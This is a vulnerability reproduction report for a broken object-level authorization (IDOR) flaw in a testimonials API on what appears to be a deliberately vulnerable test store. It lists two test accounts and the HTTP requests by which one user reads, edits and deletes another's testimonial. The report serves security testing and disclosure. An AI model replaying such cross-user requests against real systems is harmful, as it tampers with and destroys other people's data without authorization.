IDOR/BOLA Vulnerability Reproduction Evidence
=============================================

Target: https://duck-store.escape.tech/api/v1/testimonials/{id}

Test Accounts:
- user_a (testuser1): ID b90a19b3-72df-448e-b42e-ca0d552338e5
- user_b (testuser2): ID abb4b216-1ab4-4ff1-8537-eb8deb5f6d1a

Steps to Reproduce:

1. CREATE testimonial as user_a:
   POST /api/v1/testimonials/
   Authorization: Bearer <user_a_token>
   Body: {"content": "Test testimonial from user_a", "rating": 5, "name": "User A", "role": "Tester"}
   Response: 200 OK, created testimonial ID 8 with user_id = b90a19b3-72df-448e-b42e-ca0d552338e5

2. READ testimonial as user_b (CROSS-USER ACCESS):
   GET /api/v1/testimonials/8
   Authorization: Bearer <user_b_token>
   Response: 200 OK - Returns user_a's testimonial data

3. MODIFY testimonial as user_b (CROSS-USER MODIFICATION):
   PUT /api/v1/testimonials/8
   Authorization: Bearer <user_b_token>
   Body: {"content": "MODIFIED by user_b - IDOR exploit", "rating": 1, "name": "Hacker", "role": "Attacker"}
   Response: 200 OK - Successfully modified user_a's testimonial

4. DELETE testimonial as user_b (CROSS-USER DELETION):
   DELETE /api/v1/testimonials/8
   Authorization: Bearer <user_b_token>
   Response: 204 No Content - Successfully deleted user_a's testimonial

5. VERIFY deletion:
   GET /api/v1/testimonials/8 (as user_a)
   Response: 404 Not Found - {"detail":"Testimonial not found"}

Proof of Vulnerability:
- user_b was able to READ, MODIFY, and DELETE user_a's testimonial (ID 8) without authorization checks
- The API does not validate that the authenticated user owns the testimonial being accessed
- This is a classic Broken Object Level Authorization (BOLA/IDOR) vulnerability

Key Evidence:
- PUT response shows 200 OK with modified content from user_b
- DELETE response shows 204 No Content
- Subsequent GET by owner (user_a) returns 404